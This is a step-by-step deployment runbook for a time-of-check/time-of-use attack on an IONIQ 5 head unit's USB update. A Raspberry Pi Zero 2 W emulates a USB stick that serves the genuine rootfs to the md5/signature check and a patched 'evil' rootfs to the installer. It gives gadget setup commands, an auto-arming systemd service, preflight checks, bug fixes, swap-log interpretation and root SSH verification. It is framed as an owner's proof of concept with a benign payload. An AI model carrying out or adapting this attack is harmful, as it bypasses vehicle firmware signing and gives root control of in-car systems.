# Pi Zero 2 W — deployment steps (owner's own decommissioned IONIQ 5)

End to end: what YOU do, in order. Everything the scripts call is standard, publicly-documented
Linux (nbdkit, nbd-client, configfs `f_mass_storage`, dwc2). Benign proof payload only.

## 0. One-time Pi prep (Pi Zero 2 W, Debian 13 / Raspberry Pi OS)
```bash
sudo apt update && sudo apt install -y nbdkit nbdkit-plugin-python nbd-client exfatprogs
```
Enable the USB **device/gadget** controller. `dwc2` is built into this kernel, but by default the
Pi binds the controller to the `dwc_otg` **host** driver, so no UDC (gadget controller) exists.
The `dwc2` overlay switches it to peripheral mode. **The overlay line must be in the `[all]`
section of `/boot/firmware/config.txt`** — a Pi Zero 2 W is not `cm4`/`cm5`/`pi5`, so a line left
under one of those filters is silently ignored. (This bit us on 2026-11-04: the line sat under
`[cm5]`, so the UDC never appeared and the controller stayed on `dwc_otg`.)
```bash
printf '\n[all]\ndtoverlay=dwc2,dr_mode=peripheral\n' | sudo tee -a /boot/firmware/config.txt
sudo reboot
```
Use the Pi Zero's **data** USB port (the inner micro-USB, not PWR) — the only one wired to the
dwc2 OTG controller, the port the head unit sees as a USB stick.

Confirm after reboot (**both** must be true):
```bash
ls /sys/class/udc                                       # must list 3f980000.usb  (UDC exists)
readlink /sys/bus/platform/devices/3f980000.usb/driver  # must end in /dwc2  (NOT dwc_otg)
```

## 1. Build the evil rootfs envelope  (already done, but to rebuild)
```bash
./01_make_evil_rootfs.sh /path/to/genuine/HU/images/mango-rootfs.tar.gz
# -> build/evil_rootfs.te2   (byte-exact, IV-identical, integrity-valid, patched payload)
```

## 2. Build the baseline USB image + regions.json  (needs sudo/loop; run on the Pi or bench)
`<package_dir>` = a copy of the genuine IONIQ5 update tree **at the same version the car runs
(260128)** — no version bump. A same-version reinstall is an allowed update path, the rootfs swap
is version-independent, and on revert it just re-lays the identical genuine version (no downgrade /
rollback-protection risk). It also skips the version gate, so `regions.json` carries only the
rootfs region. The genuine `mango-rootfs.tar.gz` is laid down first so it is one contiguous extent
→ one swap region.

> Caveat: make sure the HU actually runs the install (reinstall/repair) on a same-version package
> instead of reporting "already up to date" and stopping. The `*** SWITCH ***` line in `toctou.log`
> is your confirmation the install pass was reached.
```bash
sudo ./02_build_usb_image.sh /path/to/package_dir build/evil_rootfs.te2 build/usb.img exfat
# -> build/usb.img  and  build/regions.json  (off/len of the rootfs extent + evil path)
```
Sanity-check the extent maps onto the genuine rootfs (the script prints this cmp line):
```bash
cmp <(dd if=build/usb.img bs=1 skip=$OFF count=16 2>/dev/null) \
    <(dd if=/path/to/package_dir/HU/images/mango-rootfs.tar.gz bs=1 count=16 2>/dev/null) \
    && echo "extent OK"
```

## 2.5 Preflight — go/no-go gate (run on the bench BEFORE touching the car)
This is the cheap insurance built from the VM Path-1 ground truth. It catches a wrong baseline,
a mis-built envelope, a wrong `regions.json` extent, or a wrong `switch_after_pass` — before the
Pi is ever plugged in.
```bash
./04_preflight.sh /path/to/package_dir     # extracts the real DecryptToPIPE once, then checks A–D
```
- **A** baseline md5 == the signed value (`7f510002…`), size exact.
- **B** `evil_rootfs.te2` occupies the identical extent and differs in content.
- **C** the **real x86-64 `DecryptToPIPE`** decrypts the evil envelope to the proven install hash
  `f83bdd…` (≠ genuine `1bea17…`) — i.e. the installer will unpack the patched rootfs. **Run C on
  the x86-64 bench; it auto-skips on the ARM Pi.**
- **D** drives the **real nbdkit plugin** against your actual `usb.img` + `regions.json`: pass #1
  serves genuine (md5sum check passes), pass #2 serves evil (DecryptToPIPE install). A FAIL here
  means the extent or the switch pass is wrong — fix before deploying.

Expect `PREFLIGHT: OK`. Do **not** proceed to the car on any FAIL.

## 3. Bring up the gadget
```bash
sudo ./03_deploy_gadget.sh                 # uses build/usb.img + build/regions.json
# modprobe dwc2/libcomposite/nbd -> nbdkit on 127.0.0.1:10809 -> nbd-client /dev/nbd0
#   -> configfs mass_storage.0 (file=/dev/nbd0) -> bind to the dwc2 UDC
```
In a second shell, watch the swap decision live:
```bash
tail -f /var/log/toctou.log
```

## 3b. (Optional) Auto-present on every boot — `toctou-gadget.service`
Installed so the gadget comes up automatically at power-on (power the Pi from the PWR port, data
port into the HU — no shell needed). Unit `/etc/systemd/system/toctou-gadget.service` is
`Type=oneshot`, `RemainAfterExit=yes`, `KillMode=none`; `ExecStart=03_deploy_gadget.sh`,
`ExecStop=99_teardown.sh`; it waits for a UDC to appear and orders after `network-online.target`.
```bash
sudo systemctl daemon-reload
sudo systemctl enable --now toctou-gadget.service   # start now + on every boot
sudo systemctl status  toctou-gadget.service
sudo systemctl stop    toctou-gadget.service        # == run 99_teardown.sh
sudo systemctl disable toctou-gadget.service        # stop auto-presenting on boot
```
`systemctl restart` cleanly tears down and re-arms. Because the pass counter lives in the nbdkit
process, a restart (or a reboot) **resets it to zero** — which is what you want before a fresh
attempt. Verify after a reboot: `systemctl is-active` = `active`,
`cat /sys/kernel/config/usb_gadget/ioniq_toctou/UDC` = `3f980000.usb`, and
`grep -c 'pass #' /var/log/toctou.log` = `0` (no passes consumed yet).

## 4. Run the update on the car
1. Plug the Pi's **data** port into the head unit's USB.
2. The HU enumerates it as a USB stick and finds the same-version package.
3. Start the software update from the HU menu.
4. In `toctou.log` you should see, for the rootfs region (pass numbers are 1-based physical reads):
   `pass #1` = `ionice -c3 md5sum` (the check) → **served genuine**, so the md5 matches the
   RSA-signed value (the signature is verified over `md5sum.txt`, **not** a re-read of the 879 MB
   rootfs — VM Path-1 confirmed the rootfs file is opened exactly twice). Then
   `pass #2` + `*** SWITCH at pass #2 ***` = `DecryptToPIPE | tar` (the install) → **consumes the
   evil image**. `switch_after_pass=2` in `regions.json` is set for exactly this.
   - The log is authoritative: if your unit reads the rootfs an extra time before install (e.g. a
     header probe counted as a sweep) and `SWITCH` lands before the install, bump
     `"switch_after_pass"` to the pass number the install actually runs on, and redo step 3.

## 5. Collect proof of execution (after the HU reboots)
Four independent channels (full detail in `STATUS.md`). Any one confirms the swap landed:
- **T2 (eyes only):** Settings → General → System Information → **Modem Information** — the IMEI
  row reads `IMEI [TOCTOU-PoC]:`.
- **T3 (live root):** `ssh root@192.168.1.100 -p 2222` from the bench (owner key, dbg0 ethernet).
- **T1 (export):** take a diagnostic log export to USB → `grep -r TOCTOU_PROOF` on it.
- **T4 (lossy):** marker in kmsg/ramoops.

## 6. Tear down
```bash
sudo ./99_teardown.sh
```

## Fixes applied bringing this up on the live Pi (2026-11-04)
Several bugs were found and fixed on the real Pi Zero 2 W (`10.10.10.153`, host `toctou`). All are
corrected in the scripts/unit here; recorded so they don't recur:
1. **`config.txt` overlay under `[cm5]`** → ignored on a Pi Zero 2 W, so the controller stayed on
   the `dwc_otg` host driver and **no UDC ever appeared**. Moved to `[all]` (see §0). This was the
   reason the gadget could not bind at all.
2. **`03_deploy_gadget.sh`: `test -S /dev/null`** under `set -euo pipefail` aborted the script
   right after starting nbdkit — `/dev/null` is a character device, not a socket, so `test -S` is
   false. Changed to `test -c`.
3. **`03`: LUN write order** — `lun.0/file` was written *before* `lun.0/ro`, but `ro` can't change
   once a backing file is attached → "Device or resource busy". `file` is now written **last**.
4. **`nbdkit_toctou.py`: wrong `pread` API.** The plugin declares `API_VERSION = 2`, under which
   nbdkit hands `pread` a **writable buffer** to fill in place — but it was written for the v1
   contract (integer `count`, return `bytes`), so every real read failed with
   `TypeError: unsupported operand type(s) for +: 'int' and 'memoryview'`. `pread` now fills the
   buffer under v2 and still accepts an int for the selftest. **Important:** preflight check D calls
   the plugin directly with an int count, so it does **not** exercise the real nbdkit API — always
   smoke-test through `nbdkit` itself (e.g. a read at offset 0, which is outside the rootfs region
   and does not consume a swap pass).
5. **Boot race:** at boot, `nbd-client`'s `getaddrinfo('127.0.0.1')` can fail with
   "Address family for hostname not supported" before `::1` is configured. `03` now retries the
   attach (15x, 2 s apart) and the unit is ordered `After=network-online.target`.

## Notes / gotchas
- The rootfs (879 MB) is larger than the Pi's RAM (512 MB), so neither the Pi nor the HU can fully
  cache it — every read pass reaches the plugin. `03` also sets `blockdev --setra 0 /dev/nbd0` to
  keep readahead from masking the switch.
- If `UDC` write fails with "device busy": a gadget is already bound — run `99_teardown.sh` first.
- If the HU won't see a filesystem: confirm `mkfs.exfat` succeeded in step 2 and that you plugged
  the **data** port, not PWR.
- nbd-client version differences: if `-N default` is rejected, use `nbd-client 127.0.0.1 10809 /dev/nbd0`.
- Installed here: nbd-client 3.26.1, nbdkit 1.42.3 (Python plugin **API v2**). On a fresh boot the
  `toctou-gadget.service` presents the gadget automatically; a bare `ls /sys/class/udc` in a
  non-login shell may look empty only because `/sbin` is off `PATH` — check with a full path.

## Reading the swap log (offline-robust, 2026-11-04)
The Pi has no wifi at the car and no RTC, so the logging was hardened to be accurate from the SD
card alone, read later. Three mechanisms:

- **Monotonic timestamps.** Every `[toctou]` line carries `<wall-time> mono=<seconds>`. `mono` is
  `CLOCK_MONOTONIC` — it never jumps and only increases within one boot, so it orders events and
  measures durations even when the wall clock is wrong. It resets to ~0 at each boot.
- **Session headers with `boot_id`.** Each nbdkit cycle logs
  `===== SESSION START sess=<id> boot=<kernel boot_id> pid=<..> switch_after_pass=2 =====` and a
  matching `SESSION END`. **Order cycles by `boot_id` + append position, never by wall clock** —
  the clock can step *backwards* across a reboot (fake-hwclock restore + NTP), so wall time lies
  about ordering; `boot_id` does not.
- **Per-pass byte tallies, fsync'd.** For each read sweep of the rootfs region:
  `PASS #n START off=..` then
  `PASS #n END reads=.. bytes_genuine=.. bytes_evil=.. served=GENUINE|EVIL|MIXED span=[..] dur=..`.
  These lines and the `SWITCH` line are `fsync`'d, so an abrupt unplug at the car keeps them.

### What a successful attack looks like
One session, in order:
```
SESSION START ... switch_after_pass=2
PASS #1 START ...
PASS #1 END  ... served=GENUINE  bytes_evil=0          <- the md5/signature CHECK read genuine (passes)
*** SWITCH at pass #2 ***
PASS #2 END  ... served=EVIL     bytes_evil=~879109759  <- the INSTALL read the patched image
```
The decisive line is the **install pass** (#2, after the SWITCH): `served=EVIL` with
`bytes_evil` near the rootfs body size (~879 MB) means the installer consumed the payload. If the
install pass shows `served=GENUINE`, the genuine image was installed and the payload was NOT
delivered (e.g. a same-version reinstall after the Pi was not re-armed).

A session with a `SESSION START` but **no PASS lines** = the head unit connected but never read the
rootfs (no install started, or "already up to date"). A session whose only PASS is `#1 served=GENUINE`
= the check ran but the install never re-read the rootfs.

### Retrieving the evidence (back in wifi)
```bash
sudo cat /var/log/toctou.log                         # primary, cross-reboot, fsync'd
journalctl -u toctou-gadget.service -o short-iso     # second copy; journal is now PERSISTENT
journalctl --list-boots                              # each boot = one car power-cycle
```
Supporting setup (all on the Pi): journald `Storage=persistent` via
`/etc/systemd/journald.conf.d/99-toctou-persistent.conf` (overrides the RPi `40-rpi-volatile`
vendor drop-in); `fake-hwclock` with a 1-minute save timer (`fake-hwclock-save.timer`) so the wall
clock stays roughly right offline. Re-arm (reboot or `systemctl restart toctou-gadget`) resets the
pass counter — do it before each fresh attempt, and confirm `served=EVIL` on the install pass before
trusting a run.
